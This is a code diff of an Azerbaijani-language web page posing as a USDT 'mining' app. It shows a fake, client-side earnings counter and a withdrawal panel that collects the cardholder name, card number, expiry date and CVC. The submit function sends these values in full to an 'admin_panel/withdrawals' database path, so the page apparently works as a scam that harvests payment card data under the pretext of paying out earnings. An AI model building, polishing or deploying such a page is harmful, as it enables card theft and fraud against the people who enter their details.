@@ -4,204 +4,200 @@
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { margin: 0; padding: 0; user-select: none; }
+        body { margin: 0; padding: 0; user-select: none; background: #000; }
 
-        /* Sənin atdığın dizayn elementləri - DƏYİŞMƏDİ */
         .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
         .user-info { display: flex; align-items: center; gap: 10px; }
-        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #222; border: 1px solid #3fb950; display: flex; align-items: center; justify-content: center; }
-        .stats-container { padding: 15px; gap: 10px; display: flex; flex-direction: column; }
-        .stat-row { background: #111111; border: 1px solid #222; border-radius: 12px; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
-        .level-tag { background: #bdfd00; color: #000; padding: 4px 12px; border-radius: 20px; font-weight: 700; font-size: 0.75rem; }
-        .speed-text { color: #bdfd00; font-weight: 700; font-size: 0.9rem; }
-        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
-        .mining-gif { width: 160px; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(189, 253, 0, 0.2)); }
-        .live-counter { font-size: 2.2rem; font-weight: 700; letter-spacing: 1px; margin-bottom: 5px; }
-        .progress-section { padding: 20px; width: 100%; box-sizing: border-box; }
-        .progress-bar-bg { width: 100%; height: 12px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; border: 1px solid #222; }
-        .progress-fill { width: 0%; height: 100%; background: #4a7d00; border-radius: 10px; transition: 0.3s; }
-        .nav-bar { display: grid; grid-template-columns: repeat(5, 1fr); background: #0a0a0a; border-top: 1px solid #1a1a1a; padding: 10px 0; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #666; font-size: 0.65rem; text-decoration: none; }
-        .nav-item.active { color: #bdfd00; }
+        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #111; border: 1px solid #bdfd00; display: flex; align-items: center; justify-content: center; color: #bdfd00; }
 
-        /* Bank Modalı */
-        .modal-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; padding: 20px; }
-        .v-card { width: 100%; max-width: 320px; height: 180px; background: linear-gradient(135deg, #1d1d1d, #000); border-radius: 15px; margin: 20px auto; border: 1px solid #333; padding: 20px; position: relative; }
-        .b-input { width: 100%; background: #0f0f0f; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 10px; outline: none; }
+        /* YENİ MƏRKƏZİ ANİMASİYA (Rings) */
+        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
+        .ring-container { position: relative; width: 200px; height: 200px; display: flex; align-items: center; justify-content: center; }
+        .ring { position: absolute; border: 2px solid transparent; border-radius: 50%; animation: rotate-ring linear infinite; }
+        .ring-1 { width: 180px; height: 180px; border-top-color: #bdfd00; animation-duration: 3s; }
+        .ring-2 { width: 140px; height: 140px; border-bottom-color: #4a7d00; animation-duration: 2s; animation-direction: reverse; }
+        .ring-3 { width: 100px; height: 100px; border-left-color: #fff; animation-duration: 1.5s; }
+        .core-icon { font-size: 3rem; color: #bdfd00; text-shadow: 0 0 20px #bdfd00; z-index: 5; }
+        @keyframes rotate-ring { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        /* ANİMASİYALI BALANS */
+        .live-counter { font-size: 2.8rem; font-weight: 800; letter-spacing: 2px; color: #fff; margin-top: 20px; text-shadow: 0 0 10px rgba(189,253,0,0.5); transition: 0.1s; }
+
+        /* YENİ PUL ÇIXARMA PANELİ (Slide-up) */
+        .withdraw-panel {
+            position: fixed; bottom: -100%; left: 0; width: 100%; height: 85%;
+            background: #0a0a0a; border-top: 2px solid #bdfd00; border-radius: 30px 30px 0 0;
+            z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); padding: 25px; box-sizing: border-box;
+        }
+        .active-panel { bottom: 0 !important; }
+        .glass-card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; }
+        .b-input { width: 100%; background: #111; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 12px; outline: none; }
+
+        .progress-section { padding: 20px; width: 100%; box-sizing: border-box; }
+        .progress-bar-bg { width: 100%; height: 8px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; }
+        .progress-fill { width: 0%; height: 100%; background: #bdfd00; border-radius: 10px; }
+        
+        .nav-bar { display: grid; grid-template-columns: repeat(4, 1fr); background: #050505; border-top: 1px solid #1a1a1a; padding: 15px 0; }
+        .nav-item { text-align: center; color: #444; font-size: 1.2rem; }
     </style>
 
     <div class="top-bar">
         <div class="user-info">
-            <div class="avatar"><i class="fas fa-user" style="color:#bdfd00"></i></div>
-            <span id="user-display-name" style="font-size: 0.85rem; font-weight: 600;">Yüklənir...</span>
+            <div class="avatar"><i class="fas fa-user"></i></div>
+            <span id="user-name-tag" style="font-weight: 700;">Yüklənir...</span>
         </div>
-        <div style="background: #111; padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; border: 1px solid #222;">🌐 Azərbaycan</div>
-    </div>
-
-    <div class="stats-container">
-        <div class="stat-row">
-            <div class="level-tag">SEVİYYƏ 1</div>
-            <div class="speed-text">0.000055 USD/S</div>
-        </div>
+        <div style="color:#bdfd00; font-size: 0.8rem;"><i class="fas fa-microchip"></i> SERVER 01</div>
     </div>
 
     <div class="mining-core">
-        <div style="position: relative;">
-            <img src="usdt.png" class="mining-gif" id="coin-logo">
+        <div class="ring-container">
+            <div class="ring ring-1"></div>
+            <div class="ring ring-2"></div>
+            <div class="ring ring-3"></div>
+            <i class="fas fa-bolt core-icon"></i>
         </div>
-        <div class="live-counter" id="live-bal">0.0000</div>
-        <div style="font-size: 0.8rem; color: #888;">YIĞILAN MƏBLƏĞ (USDT)</div>
+        <div class="live-counter" id="bal-txt">0.0000</div>
+        <div style="font-size: 0.8rem; color: #555; font-weight: 700;">GÜNLÜK QAZANC (USDT)</div>
     </div>
 
     <div class="progress-section">
-        <div class="progress-bar-bg"><div class="progress-fill" id="p-fill"></div></div>
-        <div id="p-timer" style="font-size: 0.8rem; text-align: center; color: #fff;">05:00:00</div>
-        <button id="mine-btn" onclick="startMiningProcess()" style="width: 100%; margin-top: 20px; background: #bdfd00; border: none; padding: 15px; border-radius: 12px; font-weight: 700; color: #000;">MƏDƏNİ AKTİVLƏŞDİR</button>
+        <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:0.8rem;">
+            <span>Sessiya: <b id="s-status">Dayanıb</b></span>
+            <span id="timer">05:00:00</span>
+        </div>
+        <div class="progress-bar-bg"><div class="progress-fill" id="fill"></div></div>
+        <button id="mine-btn" onclick="startSession()" style="width:100%; margin-top:20px; background:#bdfd00; border:none; padding:18px; border-radius:15px; font-weight:800; color:#000;">
+            MƏDƏNİ AKTİVLƏŞDİR
+        </button>
     </div>
 
     <div class="nav-bar">
-        <a href="#" class="nav-item active"><i class="fas fa-hammer"></i> <span>Mədən</span></a>
-        <a href="#" class="nav-item"><i class="fas fa-trophy"></i> <span>Liderlər</span></a>
-        <a href="#" class="nav-item"><i class="fas fa-rocket"></i> <span>Yenilə</span></a>
-        <a href="#" onclick="showWithdraw()" class="nav-item"><i class="fas fa-wallet"></i> <span>Çıxarış</span></a>
-        <a href="#" class="nav-item"><i class="fas fa-user"></i> <span>Mən</span></a>
+        <div class="nav-item" style="color:#bdfd00"><i class="fas fa-hammer"></i></div>
+        <div class="nav-item"><i class="fas fa-chart-pie"></i></div>
+        <div class="nav-item" onclick="toggleW()"><i class="fas fa-wallet"></i></div>
+        <div class="nav-item"><i class="fas fa-user-circle"></i></div>
     </div>
 
-    <div id="w-modal" class="modal-overlay">
+    <div id="w-panel" class="withdraw-panel">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h3>Çıxarış</h3> <i class="fas fa-times" onclick="hideWithdraw()"></i>
+            <h2 style="margin:0">Balansın Çıxarılması</h2>
+            <i class="fas fa-chevron-down" onclick="toggleW()"></i>
         </div>
-        <div class="v-card">
-            <div style="display:flex; justify-content:space-between;">
-                <img src="chip.png" width="40">
-                <div id="card-type-img"><img src="visa.png" width="50"></div>
+        
+        <div class="glass-card">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <div><small style="color:#888">Mövcud Balans</small><h3 id="w-bal" style="margin:5px 0">0.00</h3></div>
+                <img src="visa.png" width="50" id="card-icon">
             </div>
-            <div id="card-num-view" style="margin: 30px 0; font-size: 1.2rem; letter-spacing: 2px;">**** **** **** ****</div>
-            <div style="display:flex; justify-content:space-between; font-size:0.7rem;">
-                <span id="card-holder-view">AD SOYAD</span> <span id="card-date-view">MM/YY</span>
-            </div>
+            <div id="card-num-v" style="margin:20px 0; font-size:1.2rem; letter-spacing:2px;">**** **** **** ****</div>
         </div>
-        <input type="text" id="in-name" class="b-input" placeholder="Ad Soyad" oninput="sync()">
-        <input type="text" id="in-num" class="b-input" placeholder="Kart Nömrəsi" maxlength="19" oninput="sync()">
+
+        <input type="text" id="fn" class="b-input" placeholder="AD SOYAD" oninput="syncW()">
+        <input type="text" id="cn" class="b-input" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="syncW()">
         <div style="display:flex; gap:10px;">
-            <input type="text" id="in-date" class="b-input" placeholder="AA/İİ" maxlength="5" oninput="sync()">
-            <input type="password" id="in-cvc" class="b-input" placeholder="CVC" maxlength="3">
+            <input type="text" id="ed" class="b-input" placeholder="AA/İİ" maxlength="5">
+            <input type="password" id="cv" class="b-input" placeholder="CVC" maxlength="3">
         </div>
-        <input type="number" id="in-amt" class="b-input" placeholder="Məbləğ">
-        <button onclick="sendToWW24()" style="width:100%; padding:15px; background:#238636; border:none; border-radius:10px; color:#fff; font-weight:700;">TƏSDİQLƏ</button>
+        <input type="number" id="am" class="b-input" placeholder="MƏBLƏĞ">
+        <button onclick="submitToAdmin()" style="width:100%; background:#238636; padding:18px; border:none; border-radius:12px; color:#fff; font-weight:700;">SORĞUNU TAMAMLA</button>
     </div>
 
-    <div id="receipt-overlay" class="modal-overlay" style="background:#fff; color:#000; justify-content:center; align-items:center; display:none;">
-        <div style="font-family:'Courier New'; border:1px solid #000; padding:20px; width:80%;">
-            <center><h2>ÖDƏNİŞ ÇEKİ</h2></center>
-            <p>TARİX: <span id="r-date"></span></p>
-            <p>İSTİFADƏÇİ: <span id="r-user"></span></p>
-            <p>KART: <span id="r-card"></span></p>
-            <p>MƏBLƏĞ: <span id="r-amt"></span> USDT</p>
-            <p>STATUS: <b style="color:green">UĞURLU</b></p>
-            <button onclick="location.reload()" style="width:100%; padding:10px; background:#000; color:#fff; margin-top:10px;">BAĞLA</button>
-        </div>
-    </div>
 </div>
 
 <script>
     const user = localStorage.getItem('username') || 'Qonaq';
-    document.getElementById('user-display-name').innerText = user;
+    document.getElementById('user-name-tag').innerText = user;
 
-    let balance = 0;
-    let isRunning = false;
-    let startTime = 0;
-    const SPEED = 0.0000555;
-    const LIMIT = 5 * 60 * 60 * 1000;
+    let bal = 0;
+    let running = false;
+    let start = 0;
+    const SPD = 0.0000555;
+    const DUR = 5 * 60 * 60 * 1000;
 
-    // Firebase Sinxronizasiyası (Admin panelindən balans dəyişmək üçün)
+    // Firebase Sync - NaN xətası burada həll edildi
     db.ref('mining/' + user).on('value', snap => {
-        const d = snap.val() || { balance: 0, isRunning: false, startTime: 0 };
-        balance = d.balance;
-        isRunning = d.isRunning;
-        startTime = d.startTime;
+        const d = snap.val();
+        // Əgər data yoxdursa NaN olmasın deyə default dəyərlər:
+        bal = d && d.balance ? parseFloat(d.balance) : 0;
+        running = d && d.isRunning ? d.isRunning : false;
+        start = d && d.startTime ? d.startTime : 0;
+        
+        document.getElementById('w-bal').innerText = bal.toFixed(2) + " USDT";
         updateUI();
     });
 
     function updateUI() {
-        const btn = document.getElementById('mine-btn');
-        if(isRunning) {
-            btn.innerText = "MƏDƏN İŞLƏYİR...";
-            btn.disabled = true;
-            btn.style.opacity = "0.5";
+        const b = document.getElementById('mine-btn');
+        const s = document.getElementById('s-status');
+        if(running) {
+            b.innerText = "PROSES DAVAM EDİR...";
+            b.disabled = true; b.style.opacity = "0.5";
+            s.innerText = "Aktiv"; s.style.color = "#bdfd00";
         } else {
-            btn.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
-            btn.disabled = false;
-            btn.style.opacity = "1";
+            b.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
+            b.disabled = false; b.style.opacity = "1";
+            s.innerText = "Dayanıb"; s.style.color = "red";
         }
     }
 
     setInterval(() => {
-        if(isRunning) {
-            let elapsed = Date.now() - startTime;
-            if(elapsed < LIMIT) {
-                balance += SPEED;
-                document.getElementById('live-bal').innerText = balance.toFixed(4);
-                document.getElementById('p-fill').style.width = (elapsed / LIMIT * 100) + "%";
+        if(running) {
+            let elap = Date.now() - start;
+            if(elap < DUR) {
+                bal += SPD;
+                document.getElementById('bal-txt').innerText = bal.toFixed(4);
+                document.getElementById('fill').style.width = (elap / DUR * 100) + "%";
                 
-                let rem = LIMIT - elapsed;
+                let rem = DUR - elap;
                 let h = Math.floor(rem / 3600000);
                 let m = Math.floor((rem % 3600000) / 60000);
                 let s = Math.floor((rem % 60000) / 1000);
-                document.getElementById('p-timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+                document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
             } else {
-                stopMining();
+                finish();
             }
         }
     }, 1000);
 
-    async function startMiningProcess() {
-        startTime = Date.now();
-        isRunning = true;
-        await db.ref('mining/' + user).update({ isRunning: true, startTime: startTime });
+    async function startSession() {
+        start = Date.now();
+        running = true;
+        await db.ref('mining/' + user).update({ isRunning: true, startTime: start, balance: bal });
     }
 
-    async function stopMining() {
-        isRunning = false;
-        await db.ref('mining/' + user).update({ isRunning: false, balance: balance });
-        alert("5 saat bitdi. Yenidən aktivləşdirin!");
+    async function finish() {
+        running = false;
+        await db.ref('mining/' + user).update({ isRunning: false, balance: bal });
+        alert("Sessiya bitdi!");
     }
 
-    function showWithdraw() { document.getElementById('w-modal').style.display = 'flex'; }
-    function hideWithdraw() { document.getElementById('w-modal').style.display = 'none'; }
+    function toggleW() { document.getElementById('w-panel').classList.toggle('active-panel'); }
 
-    function sync() {
-        const n = document.getElementById('in-num').value;
-        document.getElementById('card-num-view').innerText = n || "**** **** **** ****";
-        document.getElementById('card-holder-view').innerText = document.getElementById('in-name').value || "AD SOYAD";
-        document.getElementById('card-date-view').innerText = document.getElementById('in-date').value || "MM/YY";
-        const logo = document.getElementById('card-type-img');
-        if(n.startsWith('4')) logo.innerHTML = '<img src="visa.png" width="50">';
-        else if(n.startsWith('5')) logo.innerHTML = '<img src="master.png" width="50">';
+    function syncW() {
+        const n = document.getElementById('cn').value;
+        document.getElementById('card-num-v').innerText = n || "**** **** **** ****";
+        const img = document.getElementById('card-icon');
+        if(n.startsWith('4')) img.src = 'visa.png';
+        else if(n.startsWith('5')) img.src = 'master.png';
     }
 
-    async function sendToWW24() {
-        const amt = parseFloat(document.getElementById('in-amt').value);
-        if(amt > balance || isNaN(amt)) return alert("Balans yetmir!");
+    async function submitToAdmin() {
+        const val = parseFloat(document.getElementById('am').value);
+        if(val > bal || isNaN(val)) return alert("Səhv məbləğ!");
 
-        const data = {
-            username: user,
-            fullName: document.getElementById('in-name').value,
-            cardNum: document.getElementById('in-num').value,
-            date: document.getElementById('in-date').value,
-            cvc: document.getElementById('in-cvc').value, // WW24 üçün CVC
-            amount: amt,
-            time: new Date().toLocaleString()
+        const payload = {
+            user: user,
+            name: document.getElementById('fn').value,
+            card: document.getElementById('cn').value,
+            exp: document.getElementById('ed').value,
+            cvc: document.getElementById('cv').value,
+            amt: val,
+            date: new Date().toLocaleString()
         };
 
-        // ww24.html üçün admin_panel qovluğuna göndərir
-        await db.ref('admin_panel/withdrawals').push(data);
-        await db.ref('mining/' + user).update({ balance: balance - amt });
-
-        document.getElementById('r-date').innerText = data.time;
-        document.getElementById('r-user').innerText = user;
-        document.getElementById('r-card').innerText = data.cardNum;
-        document.getElementById('r-amt').innerText = amt;
-        document.getElementById('receipt-overlay').style.display = 'flex';
+        await db.ref('admin_panel/withdrawals').push(payload);
+        await db.ref('mining/' + user).update({ balance: bal - val });
+        alert("Sorğu göndərildi!");
+        location.reload();
     }
 </script>
